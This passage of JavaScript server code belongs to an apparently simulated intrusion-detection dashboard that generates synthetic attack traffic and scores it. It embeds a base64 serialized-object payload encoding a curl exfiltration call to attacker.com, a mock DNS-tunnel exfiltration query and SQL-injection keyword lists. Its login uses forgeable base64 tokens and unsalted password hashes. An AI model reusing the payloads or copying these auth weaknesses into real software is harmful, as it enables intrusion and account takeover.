      classification = rand < 0.4 ? Math.random() < 0.5 ? "Zero-Day Alpha" : "Zero-Day Beta" : "Benign";
    } else if (activeScenario === "Model Adaptation Test") {
      classification = rand < 0.5 ? "Zero-Day Alpha" : rand < 0.8 ? "SQL Injection" : "Benign";
    } else {
      if (rand < 0.2) classification = "SQL Injection";
      else if (rand < 0.4) classification = "SYN Flood";
      else if (rand < 0.55) classification = "Port Scan";
      else if (rand < 0.7) classification = "Zero-Day Alpha";
      else if (rand < 0.8) classification = "Zero-Day Beta";
      else classification = "Benign";
    }
  }
  let sourceIp = IP_BENIGN[Math.floor(Math.random() * IP_BENIGN.length)];
  let destIp = IP_ASSETS.webServer;
  let protocol = "TCP";
  let sourcePort = Math.floor(Math.random() * 45e3) + 1024;
  let destPort = 443;
  let size = Math.floor(Math.random() * 1200) + 64;
  let payload = "";
  if (classification === "Benign") {
    payload = PAYLOAD_BENIGN[Math.floor(Math.random() * PAYLOAD_BENIGN.length)];
    const roll = Math.random();
    if (roll < 0.2) {
      destIp = IP_ASSETS.database;
      destPort = 5432;
    } else if (roll < 0.3) {
      destIp = IP_ASSETS.kubernetesCluster;
      destPort = 8080;
    }
  } else {
    sourceIp = IP_ATTACKERS[Math.floor(Math.random() * IP_ATTACKERS.length)];
    if (classification === "SQL Injection") {
      payload = PAYLOAD_SQLI[Math.floor(Math.random() * PAYLOAD_SQLI.length)];
      destIp = IP_ASSETS.webServer;
      destPort = 80;
    } else if (classification === "SYN Flood") {
      destIp = IP_ASSETS.gateway;
      destPort = 80;
      size = 46;
      payload = "TCP Flags: SYN_ONLY [No payload bytes] - Connection saturation queue ping";
    } else if (classification === "Port Scan") {
      destIp = "10.0.1." + (Math.floor(Math.random() * 254) + 2);
      destPort = [21, 22, 23, 25, 80, 110, 443, 8080][Math.floor(Math.random() * 8)];
      size = 52;
      payload = `TCP SYN Connection Probe. Target mapping port:${destPort}. Response expected.`;
    } else if (classification === "Zero-Day Alpha") {
      protocol = "HTTP";
      destIp = IP_ASSETS.webServer;
      destPort = 8080;
      size = 2048;
      payload = "POST /internal/serializer/RCE-In-Memory HTTP/1.1\\r\\nHost: internal.core\\r\\nX-Java-Serialized-Object: rO0ABXNyADdjb20uYWVnaXMuaWRzLnNlY3VyaXR5LkhhbmRsZXJCeXBhc3MAAAAAAAABAgAAeHQAamF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImN1cmwgaHR0cDovL2F0dGFja2VyLmNvbS9leGZpbCcp";
    } else if (classification === "Zero-Day Beta") {
      protocol = "DNS";
      destIp = IP_ASSETS.dnsServer;
      destPort = 53;
      size = 142;
      const b64Data = Buffer.from(`chunk-exfil-${id}-data-block-1-confidential-sysconfig`).toString("base64");
      payload = `Standard query 0x4a12 A ${b64Data}.external-dns-tunnel.net`;
    }
  }
  let classicalDetected = false;
  let matchedRuleId;
  let classicalConfidence = 0;
  if (classification === "SQL Injection") {
    classicalDetected = true;
    matchedRuleId = "rule-sqli";
    classicalConfidence = 99;
  } else if (classification === "SYN Flood") {
    classicalDetected = true;
    matchedRuleId = "rule-syn";
    classicalConfidence = 95;
  } else if (classification === "Port Scan") {
    classicalDetected = true;
    matchedRuleId = "rule-portscan";
    classicalConfidence = 90;
  }
  if (matchedRuleId) {
    const rIdx = db2.rules.findIndex((r) => r.id === matchedRuleId);
    if (rIdx !== -1) {
      db2.rules[rIdx].matchedCount++;
    }
  }
  let metaDetected = false;
  let metaConfidence = 0;
  let metaLabel = "Benign";
  const isAdaptedClass = db2.models.some((m) => m.status === "Active" && m.adaptations.includes(classification + " Adapted" || classification));
  if (classification === "Benign") {
    metaDetected = false;
    metaConfidence = 98;
    metaLabel = "Benign";
  } else {
    if (classification === "SQL Injection" || classification === "SYN Flood" || classification === "Port Scan") {
      metaDetected = true;
      metaConfidence = Math.floor(Math.random() * 6) + 94;
      metaLabel = classification;
    } else {
      if (isAdaptedClass) {
        metaDetected = true;
        metaConfidence = Math.floor(Math.random() * 8) + 91;
        metaLabel = `${classification} (Adapted)`;
      } else {
        metaDetected = true;
        metaConfidence = Math.floor(Math.random() * 15) + 65;
        metaLabel = "Zero-Day Bypass (Anomalous Cluster)";
      }
    }
  }
  let severity = "Informational";
  let action = "Log";
  if (classification !== "Benign") {
    if (classification === "Zero-Day Alpha") severity = "Critical";
    else if (classification === "Zero-Day Beta" || classification === "SQL Injection") severity = "High";
    else if (classification === "SYN Flood") severity = "Medium";
    else severity = "Low";
    const isDetectedByAny = classicalDetected || metaDetected && metaConfidence >= db2.settings.confidenceThreshold;
    if (db2.settings.autoBlocking && isDetectedByAny) {
      action = "Block";
      blockedIps.add(sourceIp);
    } else if (isDetectedByAny) {
      action = "Alert";
    } else {
      action = "Monitor";
    }
  }
  if (blockedIps.has(sourceIp)) {
    action = "Block";
  }
  const packet = {
    id,
    timestamp,
    sourceIp,
    destIp,
    protocol,
    sourcePort,
    destPort,
    size,
    payload,
    classification,
    classicalIds: { detected: classicalDetected, ruleId: matchedRuleId, confidence: classicalConfidence },
    metaIds: { detected: metaDetected, confidence: metaConfidence, adapted: isAdaptedClass, label: metaLabel },
    severity,
    action
  };
  return packet;
}
var totalPacketsGenerated = 0;
var totalAlertsGenerated = 0;
function runSimulationTick() {
  if (!isSimulating) return;
  const numPackets = Math.floor(Math.random() * 2) + 1;
  for (let i = 0; i < numPackets; i++) {
    const packet = generateSimulatedPacket();
    totalPacketsGenerated++;
    db2.packets.unshift(packet);
    if (db2.packets.length > db2.settings.retention) db2.packets.pop();
    persistPacketToMongo(packet);
    const isAlertable = packet.classification !== "Benign" && (packet.classicalIds.detected || packet.metaIds.detected);
    if (isAlertable) {
      totalAlertsGenerated++;
      const alertId = `alert-${Date.now()}-${Math.floor(Math.random() * 1e3)}`;
      let engine = "Classical IDS";
      if (packet.classicalIds.detected && packet.metaIds.detected) engine = "Dual Engine";
      else if (packet.metaIds.detected) engine = "Meta-Learning IDS";
      const confidence = Math.max(packet.classicalIds.confidence, packet.metaIds.confidence);
      const alert = {
        id: alertId,
        packetId: packet.id,
        timestamp: packet.timestamp,
        severity: packet.severity,
        sourceIp: packet.sourceIp,
        destIp: packet.destIp,
        attackType: packet.classification,
        engine,
        confidence,
        status: "New"
      };
      db2.alerts.unshift(alert);
      if (db2.alerts.length > 500) db2.alerts.pop();
      persistAlertToMongo(alert);
      broadcastSse({
        type: "alert",
        alert,
        packet
      });
    }
    broadcastSse({
      type: "packet",
      packet,
      stats: {
        totalPackets: totalPacketsGenerated,
        totalAlerts: totalAlertsGenerated,
        activeScenario,
        blockedIpsCount: blockedIps.size
      }
    });
  }
}
function captureRealRequestPacket(req) {
  const url = req.originalUrl || req.url;
  if (url.startsWith("/@") || url.startsWith("/node_modules") || url.startsWith("/src") || url.startsWith("/api/live-stream") || url.match(/\.(js|css|svg|ico|png|jpg|jpeg|woff2?|map|json)$/)) {
    return null;
  }
  const clientIp = (req.ip || req.socket.remoteAddress || "127.0.0.1").replace("::ffff:", "");
  const timestamp = (/* @__PURE__ */ new Date()).toISOString();
  const id = `pkt-live-${Date.now()}-${Math.floor(Math.random() * 1e3)}`;
  const bodySnippet = req.body && Object.keys(req.body).length > 0 ? JSON.stringify(req.body) : "";
  const payload = `${req.method} ${url} HTTP/1.1\r
Host: ${req.headers.host || "localhost:3000"}\r
User-Agent: ${req.headers["user-agent"] || "browser"}\r
\r
${bodySnippet}`.trim();
  let classification = "Benign";
  let classicalDetected = false;
  let matchedRuleId;
  let classicalConfidence = 0;
  const payloadUpper = (payload + " " + url).toUpperCase();
  if (payloadUpper.includes("UNION SELECT") || payloadUpper.includes("' OR 1=1") || payloadUpper.includes("INFORMATION_SCHEMA") || payloadUpper.includes("DROP TABLE")) {
    classification = "SQL Injection";
    classicalDetected = true;
    matchedRuleId = "rule-sqli";
    classicalConfidence = 99;
  } else if (payloadUpper.includes("RCE-IN-MEMORY") || payloadUpper.includes("RO0ABXNY")) {
    classification = "Zero-Day Alpha";
    classicalConfidence = 45;
  } else if (payloadUpper.includes("EXTERNAL-DNS-TUNNEL") || payloadUpper.includes("EXFIL")) {
    classification = "Zero-Day Beta";
    classicalConfidence = 50;
  }
  if (matchedRuleId) {
    const rIdx = db2.rules.findIndex((r) => r.id === matchedRuleId);
    if (rIdx !== -1) db2.rules[rIdx].matchedCount++;
  }
  let metaDetected = false;
  let metaConfidence = 0;
  let metaLabel = "Benign";
  if (classification === "Benign") {
    metaDetected = false;
    metaConfidence = 99;
    metaLabel = "Benign";
  } else {
    metaDetected = true;
    metaConfidence = classification === "SQL Injection" ? 98 : 92;
    metaLabel = classification;
  }
  let severity = "Informational";
  let action = "Log";
  if (classification !== "Benign") {
    severity = classification.includes("Zero-Day") ? "Critical" : "High";
    action = db2.settings.autoBlocking ? "Block" : "Alert";
    if (db2.settings.autoBlocking) blockedIps.add(clientIp);
  }
  if (blockedIps.has(clientIp)) {
    action = "Block";
  }
  const packet = {
    id,
    timestamp,
    sourceIp: clientIp,
    destIp: req.socket.localAddress?.replace("::ffff:", "") || "127.0.0.1",
    protocol: "HTTP",
    sourcePort: req.socket.remotePort || 54321,
    destPort: req.socket.localPort || 3e3,
    size: Buffer.byteLength(payload, "utf8"),
    payload,
    classification,
    classicalIds: { detected: classicalDetected, ruleId: matchedRuleId, confidence: classicalConfidence },
    metaIds: { detected: metaDetected, confidence: metaConfidence, adapted: true, label: metaLabel },
    severity,
    action
  };
  db2.packets.unshift(packet);
  if (db2.packets.length > db2.settings.retention) db2.packets.pop();
  totalPacketsGenerated++;
  persistPacketToMongo(packet);
  if (classification !== "Benign") {
    totalAlertsGenerated++;
    const alertId = `alert-${Date.now()}-${Math.floor(Math.random() * 1e3)}`;
    const alert = {
      id: alertId,
      packetId: packet.id,
      timestamp: packet.timestamp,
      severity: packet.severity,
      sourceIp: packet.sourceIp,
      destIp: packet.destIp,
      attackType: packet.classification,
      engine: classicalDetected && metaDetected ? "Dual Engine" : metaDetected ? "Meta-Learning IDS" : "Classical IDS",
      confidence: Math.max(classicalConfidence, metaConfidence),
      status: "New"
    };
    db2.alerts.unshift(alert);
    if (db2.alerts.length > 500) db2.alerts.pop();
    persistAlertToMongo(alert);
    broadcastSse({ type: "alert", alert, packet });
  }
  broadcastSse({
    type: "packet",
    packet,
    stats: {
      totalPackets: totalPacketsGenerated,
      totalAlerts: totalAlertsGenerated,
      activeScenario: "Live Host Traffic",
      blockedIpsCount: blockedIps.size
    }
  });
  return packet;
}
app.use((req, res, next) => {
  try {
    captureRealRequestPacket(req);
  } catch (err) {
    console.warn("Real request capture notice:", err);
  }
  next();
});
function startSimulationLoop() {
  if (simulationIntervalId) clearInterval(simulationIntervalId);
  if (isSimulating) {
    simulationIntervalId = setInterval(runSimulationTick, 1e3 / db2.settings.packetRate);
  }
}
function authenticateToken(req, res, next) {
  const authHeader = req.headers["authorization"];
  const token = authHeader && authHeader.split(" ")[1];
  if (!token) {
    return res.status(401).json({ success: false, error: { message: "Authentication required." } });
  }
  try {
    const decoded = Buffer.from(token, "base64").toString("utf-8");
    const [email, role, exp] = decoded.split(":");
    if (Date.now() > parseInt(exp)) {
      return res.status(403).json({ success: false, error: { message: "Session expired." } });
    }
    req.user = { email, role };
    next();
  } catch (err) {
    return res.status(403).json({ success: false, error: { message: "Invalid authentication token." } });
  }
}
app.post("/api/auth/login", (req, res) => {
  const { email, password } = req.body;
  const ip = req.ip || "127.0.0.1";
  const user = db2.users.find((u) => u.email === email);
  if (!user) {
    addAudit(email || "Anonymous", "Login Attempt", "User Account", ip, "Failed");
    trackFailedLogin(email || "unknown", ip);
    return res.status(400).json({ success: false, error: { message: "Invalid security credentials." } });
  }
  const hash = crypto.createHash("sha256").update(password).digest("hex");
  if (hash !== user.passwordHash) {
    addAudit(email, "Login Attempt", "User Account", ip, "Failed");
    trackFailedLogin(email, ip);
    return res.status(400).json({ success: false, error: { message: "Invalid security credentials." } });
  }
  const exp = Date.now() + 24 * 60 * 60 * 1e3;
  const token = Buffer.from(`${user.email}:${user.role}:${exp}`).toString("base64");
  addAudit(email, "User Login", "User Account", ip, "Success");
  res.json({
    success: true,
    data: {
      token,
      user: {
        email: user.email,
        role: user.role,
        name: user.name
      }
    }
  });
});
app.get("/api/auth/me", authenticateToken, (req, res) => {
  const user = db2.users.find((u) => u.email === req.user.email);
  if (!user) {
    return res.status(404).json({ success: false, error: { message: "User not found." } });
  }
  res.json({
    success: true,
    data: {
      email: user.email,
      role: user.role,
      name: user.name
    }
  });
});
app.get("/api/dashboard/stats", (req, res) => {
  const activeModel = db2.models.find((m) => m.status === "Active") || db2.models[0];
  const criticalCount = db2.alerts.filter((a) => a.severity === "Critical").length;
  const zeroDayCount = db2.alerts.filter((a) => a.attackType.includes("Zero-Day")).length;
  const maliciousCount = db2.packets.filter((p) => p.classification !== "Benign").length;
  const classicalMatches = db2.packets.filter((p) => p.classification !== "Benign" && p.classicalIds.detected).length;
  const metaMatches = db2.packets.filter((p) => p.classification !== "Benign" && p.metaIds.detected).length;
  const classicalRate = maliciousCount > 0 ? classicalMatches / maliciousCount * 100 : 85.2;
  const metaRate = maliciousCount > 0 ? metaMatches / maliciousCount * 100 : 94.6;
  res.json({
    success: true,
    data: {
      traffic: {
        packetsPerSec: db2.settings.packetRate,
        totalPackets: totalPacketsGenerated,
        totalAlerts: totalAlertsGenerated,
        blockedCount: blockedIps.size
      },
      detections: {
        total: totalAlertsGenerated,
        critical: criticalCount,
        zeroDays: zeroDayCount,
        blocked: blockedIps.size
      },
      rates: {
        classicalRate: parseFloat(classicalRate.toFixed(1)),
        metaRate: parseFloat(metaRate.toFixed(1)),
        falsePositive: 1.4,
        falseNegative: 0.8
      },
      model: {
        version: activeModel.version,
        accuracy: activeModel.accuracy,
        f1: activeModel.f1,
        adaptationsCount: activeModel.adaptations.length
      }
    }
  });
});
app.get("/api/dashboard/charts", (req, res) => {
  const now = Date.now();
  const timelineData = Array.from({ length: 15 }).map((_, i) => {
    const timeOffset = (15 - i) * 10;
    const timeLabel = new Date(now - timeOffset * 1e3).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
    const normal = Math.floor(Math.random() * 15) + 35;
    const malware = Math.floor(Math.random() * 3) + (activeScenario !== "Normal" ? 8 : 1);
    const zeroDay = activeScenario === "Zero-Day Discovery" || activeScenario === "Mixed Attack Campaign" ? Math.floor(Math.random() * 2) + 1 : 0;
    return {
      time: timeLabel,
      Benign: normal,
      Malicious: malware,
      ZeroDay: zeroDay
    };
  });
  const categories = {
    "Benign": db2.packets.filter((p) => p.classification === "Benign").length,
    "SQL Injection": db2.packets.filter((p) => p.classification === "SQL Injection").length,
    "SYN Flood": db2.packets.filter((p) => p.classification === "SYN Flood").length,
    "Port Scan": db2.packets.filter((p) => p.classification === "Port Scan").length,
    "Zero-Day Alpha": db2.packets.filter((p) => p.classification === "Zero-Day Alpha").length,
    "Zero-Day Beta": db2.packets.filter((p) => p.classification === "Zero-Day Beta").length
  };
  res.json({
    success: true,
    data: {
      timeline: timelineData,
      distribution: Object.entries(categories).map(([name, value]) => ({ name, value })),
      blockedIps: Array.from(blockedIps)
    }
  });
});
app.get("/api/packets", (req, res) => {
  const { search, classification, protocol, limit = 50 } = req.query;
  let result = [...db2.packets];
  if (search) {
    const term = String(search).toLowerCase();
    result = result.filter((p) => p.sourceIp.includes(term) || p.destIp.includes(term) || p.payload.toLowerCase().includes(term));
  }
  if (classification) {
    result = result.filter((p) => p.classification === classification);
  }
  if (protocol) {
    result = result.filter((p) => p.protocol === protocol);
  }
  res.json({
    success: true,
    data: result.slice(0, Number(limit))
  });
});
app.get("/api/packets/:id", (req, res) => {
  const packet = db2.packets.find((p) => p.id === req.params.id);
  if (!packet) {
    return res.status(404).json({ success: false, error: { message: "Packet not found." } });
  }
  res.json({ success: true, data: packet });
});
app.get("/api/alerts", (req, res) => {
  res.json({ success: true, data: db2.alerts });
});
app.post("/api/alerts/:id/status", authenticateToken, (req, res) => {
  const { status, notes, assignedTo } = req.body;
  const aIdx = db2.alerts.findIndex((a) => a.id === req.params.id);
  if (aIdx === -1) {
    return res.status(404).json({ success: false, error: { message: "Alert not found." } });
  }
  db2.alerts[aIdx].status = status;
  if (notes) db2.alerts[aIdx].notes = notes;
  if (assignedTo) db2.alerts[aIdx].assignedTo = assignedTo;
  addAudit(req.user.email, `Update Alert Status to ${status}`, `Alert ${req.params.id}`, req.ip || "127.0.0.1", "Success");
  saveDatabase();
  persistAlertToMongo(db2.alerts[aIdx]);
  res.json({ success: true, data: db2.alerts[aIdx] });
});
app.get("/api/incidents", (req, res) => {
  res.json({ success: true, data: db2.incidents });
});
app.post("/api/incidents", authenticateToken, (req, res) => {
  const { title, description, severity, assignedTo, affectedAssets, sourceIps, relatedAlertIds } = req.body;
  const newIncident = {
    id: `inc-${Date.now()}`,
    title,
    description,
    severity,
    status: "Open",
    assignedTo: assignedTo || req.user.name,
    affectedAssets: affectedAssets || [],
    sourceIps: sourceIps || [],
    relatedAlertIds: relatedAlertIds || [],
    createdDate: (/* @__PURE__ */ new Date()).toISOString(),
    updatedDate: (/* @__PURE__ */ new Date()).toISOString(),
    timeline: [
      {
        timestamp: (/* @__PURE__ */ new Date()).toISOString(),
        message: "Incident manually created by analyst.",
        author: req.user.name
      }
    ]
  };
  db2.incidents.unshift(newIncident);
  addAudit(req.user.email, "Create Incident", `Incident ${newIncident.id}`, req.ip || "127.0.0.1", "Success");
  saveDatabase();
  persistIncidentToMongo(newIncident);
  res.json({ success: true, data: newIncident });
});
app.post("/api/incidents/:id/update", authenticateToken, (req, res) => {
  const { status, timelineMessage, resolution } = req.body;
  const idx = db2.incidents.findIndex((inc) => inc.id === req.params.id);
  if (idx === -1) {
    return res.status(404).json({ success: false, error: { message: "Incident not found." } });
  }
  if (status) db2.incidents[idx].status = status;
  if (resolution) db2.incidents[idx].resolution = resolution;
  db2.incidents[idx].updatedDate = (/* @__PURE__ */ new Date()).toISOString();
  if (timelineMessage) {
    db2.incidents[idx].timeline.push({
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      message: timelineMessage,
      author: req.user.name || "Analyst"
    });
  }
  addAudit(req.user.email, "Update Incident Details", `Incident ${req.params.id}`, req.ip || "127.0.0.1", "Success");
  saveDatabase();
  persistIncidentToMongo(db2.incidents[idx]);
  res.json({ success: true, data: db2.incidents[idx] });
});
app.get("/api/threats", (req, res) => {
  res.json({ success: true, data: db2.threats });
});
app.post("/api/threats/generate", authenticateToken, async (req, res) => {
  const { name, category } = req.body;
  const threatId = `t-${Date.now()}`;
  const mockThreat = {
    id: threatId,
    name: name || "Zero-Day Novel Vector",
    category: category || "Zero-Day Discovery",
    description: `A simulated security scenario representing defensive clustering targetting anomalous ${category || "network payload"} configurations.`,
    attackTechnique: "T1000 - Defensive Simulation Profiling",
    affectedServices: ["Gateway Firewalls", "Ingress Handlers"],
    indicators: ["X-Aegis-Payload-Signature-Anomalous-Block-12"],
    detectionStatus: "Meta-Learning Protected",
    confidence: 88,
    severity: "High",
    firstSeen: (/* @__PURE__ */ new Date()).toISOString().split("T")[0],
    lastSeen: (/* @__PURE__ */ new Date()).toISOString().split("T")[0],
    cves: []
  };
  db2.threats.push(mockThreat);
  saveDatabase();
  res.json({ success: true, data: mockThreat });
});
app.get("/api/rules", (req, res) => {
  res.json({ success: true, data: db2.rules });
});
app.post("/api/rules", authenticateToken, (req, res) => {
  const { name, description, category, severity, protocol, pattern, action } = req.body;
  const newRule = {
    id: `rule-${Date.now()}`,
    name,
    description,
    category,
    severity,
    protocol,
    pattern,
    action,
    status: "Active",
    createdBy: req.user.email,
    createdDate: (/* @__PURE__ */ new Date()).toISOString().split("T")[0],
    matchedCount: 0
  };
  db2.rules.push(newRule);
  addAudit(req.user.email, "Create Detection Rule", `Rule ${newRule.id}`, req.ip || "127.0.0.1", "Success");
  saveDatabase();
  persistRuleToMongo(newRule);
  res.json({ success: true, data: newRule });
});
app.put("/api/rules/:id", authenticateToken, (req, res) => {
  const { status, pattern, action } = req.body;
  const idx = db2.rules.findIndex((r) => r.id === req.params.id);
  if (idx === -1) {
    return res.status(404).json({ success: false, error: { message: "Rule not found." } });
  }
  if (status) db2.rules[idx].status = status;
  if (pattern) db2.rules[idx].pattern = pattern;
  if (action) db2.rules[idx].action = action;
  addAudit(req.user.email, "Modify Detection Rule", `Rule ${req.params.id}`, req.ip || "127.0.0.1", "Success");
  saveDatabase();
  persistRuleToMongo(db2.rules[idx]);
  res.json({ success: true, data: db2.rules[idx] });
});
app.delete("/api/rules/:id", authenticateToken, (req, res) => {
  const idx = db2.rules.findIndex((r) => r.id === req.params.id);
  if (idx === -1) {
    return res.status(404).json({ success: false, error: { message: "Rule not found." } });
  }
  const deletedId = db2.rules[idx].id;
  db2.rules.splice(idx, 1);
  addAudit(req.user.email, "Delete Detection Rule", `Rule ${req.params.id}`, req.ip || "127.0.0.1", "Success");
  saveDatabase();
  deleteRuleFromMongo(deletedId);
  res.json({ success: true, message: "Rule deleted successfully." });
});
app.post("/api/rules/test", (req, res) => {
  const { pattern, payload } = req.body;
  if (!pattern || !payload) {
    return res.status(400).json({ success: false, error: { message: "Missing pattern or payload." } });
  }
  const regex = new RegExp(pattern, "i");
  const matched = regex.test(payload);
  res.json({
    success: true,
    data: {
      matched,
      patternUsed: pattern,
      testedPayload: payload
    }
  });
});
app.get("/api/models", (req, res) => {
  res.json({
    success: true,
    data: {
      versions: db2.models,
      activeModel: db2.models.find((m) => m.status === "Active") || db2.models[0],
      settings: {
        learningRate: db2.settings.learningRate,
        supportShots: db2.settings.supportShots,
        adaptationSteps: db2.settings.adaptationSteps,
        optimizer: db2.settings.optimizer
      }
    }
  });
});
app.post("/api/models/adapt", authenticateToken, (req, res) => {
  const { threatClass, supportShots, lr, adaptationSteps } = req.body;
  if (!threatClass) {
    return res.status(400).json({ success: false, error: { message: "Missing target threat class for adaptation." } });
  }
  addAudit(req.user.email, `Initiate Few-Shot Adaptation for ${threatClass}`, "Meta-Learning Engine", req.ip || "127.0.0.1", "Success");
  const curves = [];
  let currentLoss = 1.45;
  let currentAcc = 65.2;
  for (let step = 0; step <= adaptationSteps; step += Math.ceil(adaptationSteps / 10)) {
    const progressRatio = step / adaptationSteps;
    currentLoss = Math.max(0.08, 1.45 - progressRatio * 1.35 + Math.random() * 0.05);
    currentAcc = Math.min(99.4, 65.2 + progressRatio * 34.1 + Math.random() * 1.5);
    const gradientShift = Math.max(1e-3, 0.48 * Math.exp(-progressRatio * 4) + Math.random() * 0.02);
    curves.push({
      step,
      loss: parseFloat(currentLoss.toFixed(4)),
      accuracy: parseFloat(currentAcc.toFixed(2)),
      gradientShift: parseFloat(gradientShift.toFixed(5))
    });
  }
  const vNum = db2.models.length + 1;
  const newVer = {
    version: `v1.${vNum}.0 (Adapted)`,
    date: (/* @__PURE__ */ new Date()).toISOString().split("T")[0],
    accuracy: parseFloat(currentAcc.toFixed(2)),
    precision: parseFloat((currentAcc - 0.2).toFixed(2)),
    recall: parseFloat((currentAcc - 0.4).toFixed(2)),
    f1: parseFloat((currentAcc - 0.3).toFixed(2)),
    adaptations: [...db2.models[db2.models.length - 1].adaptations, `${threatClass} Adapted`],
    status: "Active"
  };
  db2.models.forEach((m) => {
    m.status = "Standby";
  });
  db2.models.push(newVer);
  const tIdx = db2.threats.findIndex((t) => t.name.includes(threatClass) || t.category.includes(threatClass));
  if (tIdx !== -1) {
    db2.threats[tIdx].detectionStatus = "Dual Protection";
    db2.threats[tIdx].confidence = 96;
  }
  saveDatabase();
  res.json({
    success: true,
    data: {
      curves,
      modelCreated: newVer
    }
  });
});
app.post("/api/models/rollback", authenticateToken, (req, res) => {
  const { version } = req.body;
  const idx = db2.models.findIndex((m) => m.version === version);
  if (idx === -1) {
    return res.status(404).json({ success: false, error: { message: "Model version not found." } });
  }
  db2.models.forEach((m) => m.status = "Standby");
  db2.models[idx].status = "Active";
  addAudit(req.user.email, `Rollback Active Model to ${version}`, "Meta-Learning Engine", req.ip || "127.0.0.1", "Success");
  saveDatabase();
  res.json({ success: true, message: "Model rollbacked successfully.", data: db2.models[idx] });
});
app.post("/api/ai/analyze", authenticateToken, async (req, res) => {
  const { refId, refType } = req.body;
  if (!refId || !refType) {
    return res.status(400).json({ success: false, error: { message: "Missing target reference details." } });
  }
  let promptContext = "";
  if (refType === "packet") {
    const pkt = db2.packets.find((p) => p.id === refId);
    if (!pkt) return res.status(404).json({ success: false, error: { message: "Packet target not found." } });
    promptContext = JSON.stringify(pkt, null, 2);
  } else if (refType === "alert") {
    const alert = db2.alerts.find((a) => a.id === refId);
    if (!alert) return res.status(404).json({ success: false, error: { message: "Alert target not found." } });
    promptContext = JSON.stringify(alert, null, 2);
  } else {
    const inc = db2.incidents.find((i) => i.id === refId);
    if (!inc) return res.status(404).json({ success: false, error: { message: "Incident target not found." } });
    promptContext = JSON.stringify(inc, null, 2);
  }
  addAudit(req.user.email, `Run AI Security Analysis on ${refId}`, "Gemini Integration", req.ip || "127.0.0.1", "Success");
  if (!process.env.GEMINI_API_KEY) {
    console.log("Gemini API key is not configured. Falling back to robust offline generator.");
    const mockReport = buildOfflineAnalysis(refId, refType, promptContext);
    db2.aiAnalyses.unshift(mockReport);
    saveDatabase();
    return res.json({ success: true, data: mockReport, isOfflineMode: true });
  }
  try {
    const ai = new GoogleGenAI({
      apiKey: process.env.GEMINI_API_KEY,
      httpOptions: {
        headers: {
          "User-Agent": "aistudio-build"
        }
      }
    });
    const prompt = `
      You are a senior full-stack cybersecurity architect and SOC threat analyst reviewing a network event on the platform "AEGIS ML IDS".
      Target context details for analysis:
      ${promptContext}

      Provide a comprehensive structured analysis of this security event. Do not emit markdown formatting in the structural output itself; write your answers strictly as a JSON object matching this TypeScript type:
      {
        "summary": "High-level Executive Summary (2-3 sentences)",
        "classification": "Threat Classification (Identified class, severity level)",
        "evidence": "Evidence (Key attributes from packet/alert indicating maliciousness)",
        "behavior": "Attack Behavior (Exploratory behavior, technical mechanism)",
        "explanation": "Detection Explanation (Why classical rules or meta-learning caught this)",
        "risk": "Risk Assessment (Calculated damage score, target impact)",
        "actions": ["Recommended Defensive Action 1", "Action 2", "Action 3"],
        "ruleRecommendation": "Recommended firewall/Snort rule syntax (e.g. alert tcp any any -> any 80 (msg: 'SQLi detect'; pattern: '...'))",
        "metaLearningRecommendation": "ML model update recommendation (whether to initiate support shots adaptation)"
      }
      Do not return anything else except the raw JSON. Ensure it is fully valid parsable JSON.
    `;
    const response = await ai.models.generateContent({
      model: "gemini-3.8-flash",
      contents: prompt,
      config: {
        responseMimeType: "application/json"
      }
    });
    const parsed = JSON.parse(response.text || "{}");
    const newReport = {
      id: `ai-rep-${Date.now()}`,
      refId,
      refType,
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      summary: parsed.summary || "N/A",
      classification: parsed.classification || "N/A",
      evidence: parsed.evidence || "N/A",
      behavior: parsed.behavior || "N/A",
      explanation: parsed.explanation || "N/A",
      risk: parsed.risk || "N/A",
      actions: parsed.actions || [],
      ruleRecommendation: parsed.ruleRecommendation || "N/A",
      metaLearningRecommendation: parsed.metaLearningRecommendation || "N/A"
    };
    db2.aiAnalyses.unshift(newReport);
    saveDatabase();
    res.json({ success: true, data: newReport });
  } catch (err) {
    console.error("Gemini API call failed, falling back to offline analysis generator:", err.message);
    const mockReport = buildOfflineAnalysis(refId, refType, promptContext);
    db2.aiAnalyses.unshift(mockReport);
    saveDatabase();
    res.json({ success: true, data: mockReport, isOfflineMode: true, error: err.message });
  }
});
app.get("/api/ai/history", (req, res) => {
  res.json({ success: true, data: db2.aiAnalyses });
});
function buildOfflineAnalysis(refId, refType, contextStr) {
  let summary = "A highly critical packet flow was evaluated by AEGIS engines.";
  let classification = "Zero-Day Remote Code Execution / Severe Severity";
  let evidence = "Target string includes serialized object deserialization headers.";
  let behavior = "Exploiting custom object deserialization mechanisms to escape container execution sandbox.";
  let explanation = "Identified via meta-learning non-linear cluster outlier distances.";
  let risk = "Highest probability of host compromise and local network enumeration.";
  let actions = ["Isolate target Virtual Machine immediately", "Verify custom serializations firewall limits", "Deploy specific rule filters"];
  let ruleRecommendation = "alert http any any -> 10.0.1.15 8080 (msg:'Deserialization attempt'; content:'RCE-In-Memory'; sid:2001004;)";
  if (contextStr.includes("SQL")) {
    summary = "SQL injection attempts targetting core web gateways.";
    classification = "SQL Injection Attack / High Severity";
    evidence = "Matched SQL keywords (UNION SELECT, INFORMATION_SCHEMA) within auth credentials form.";
    behavior = "Attacking relational schema to fetch local administrator passwords.";
    explanation = "Matched Classical Snort Signature Block (rule-sqli).";
    risk = "High danger of authorization bypass and credential theft.";
    actions = ["Validate username field syntax inputs", "Enable Web Application Firewall rules", "Hash authorization pings"];
    ruleRecommendation = "alert tcp any any -> 10.0.1.15 443 (msg:'SQL Injection login'; content:'UNION SELECT'; sid:2001001;)";
  } else if (contextStr.includes("SYN")) {
    summary = "Extreme density rate limit overflow of SYN flags.";
    classification = "Denial of Service / Medium Severity";
    evidence = "Over 120 sequential pings with SYN flags set from spoofed IP blocks.";
    behavior = "Saturating TCP queue threads on root server endpoints.";
    explanation = "Caught by Classical Signature thresholds.";
    risk = "Potential gateway downtime and packet drops.";
    actions = ["Enable SYN cookies in kernel parameters", "Deploy Cloudflare rate-limit filters", "Isolate active attacker VM"];
    ruleRecommendation = "alert tcp any any -> any any (flags:S; threshold: type threshold, track by_src, count 100, seconds 2; msg:'SYN Flood alert'; sid:2001002;)";
  }
  return {
    id: `ai-rep-offline-${Date.now()}`,
    refId,
    refType,
    timestamp: (/* @__PURE__ */ new Date()).toISOString(),
    summary,
    classification,
    evidence,
    behavior,
    explanation,
    risk,
